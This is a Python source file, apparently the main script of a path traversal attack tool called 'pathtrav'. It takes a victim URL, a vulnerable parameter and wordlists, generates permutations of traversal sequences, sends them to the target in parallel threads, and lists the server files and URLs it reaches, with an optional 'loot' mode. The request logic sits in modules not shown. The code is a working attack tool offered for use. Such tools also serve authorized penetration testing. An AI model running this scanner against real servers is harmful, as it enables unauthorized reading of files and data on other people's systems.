#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

import treelib, argparse
from multiprocessing.pool import ThreadPool as Pool
import requests, sys
import random, string
import subprocess

from itertools import permutations
from modvles.query import query
from core.parser import build_parser
from core.print import banner

from core.tree import *
from core.variables import *

filetree = treelib.Tree()
filetree.create_node(color.O+"/"+color.END+color.RD, "root")

def listsplit(l, n):
    if n == 0:
        n += 1
    for i in range(0, len(l), n):
        yield l[i:i + n] 
        

def main() -> int:    
    banner()
    parser = build_parser()
    opt = vars(parser.parse_args())
    args = parser.parse_args()
    if not (opt["lists"] and opt["victim"] and opt["attack"]):
        parser.print_usage()
        sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -v, -a and -l mandatory')
    dirs = opt["lists"]
    if opt['lists']:
        with open(args.lists[0]) as filelisted:
            for l in filelisted:
                commons.append(l.strip())
        with open(args.lists[1]) as dirlisted:
            for l in dirlisted:
                sdirs.append(l.strip())
  
    loot = False
    victim2 = ""
    depth = 2
    verbose = False
    dirs = 0
    summary = False
    foundfiles = [""]
    foundurls = [""]

    if opt["loot"]:
        loot = True

    if opt["v2"]:
        victim2 = args.v2

    if opt["depth"]:
        depth = args.depth

    if opt["verbosity"]:
        verbose = True
        
    if opt["summary"]:
        summary = True
        
    iter=1
    ndirs=list.copy(sdirs)
    del ndirs[0]
    mdirs=[]
    while (iter<=(depth)):
        mdirs += permutations(ndirs,(iter+1))
        iter+=1
    for elem in mdirs:
        diri=''.join(elem)
        sdirs.append(diri)
    splitted = listsplit(sdirs, round(len(sdirs)/processes))

    if (args.attack == 1):
        if not opt["param"]:
            parser.print_usage()
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -p mandatory for -a 1')
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(query, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,)) for l in splitted]
            for i in res:
                restuple = i.get()
                foundfiles += restuple[0]
                foundurls += restuple[1]
        if summary:
            banner()
            if foundfiles:
                create_tree(filetree, foundfiles)
                filetree.show()
            if foundurls:
                fnd = []
                for i in foundurls:
                    if i not in fnd:
                        print(color.END+i)
                        fnd.append(i)
            else:
                print("nothing found")


if __name__ == "__main__":
    try:
       main()
    except KeyboardInterrupt:
        print('\nInterrvpted.\n')
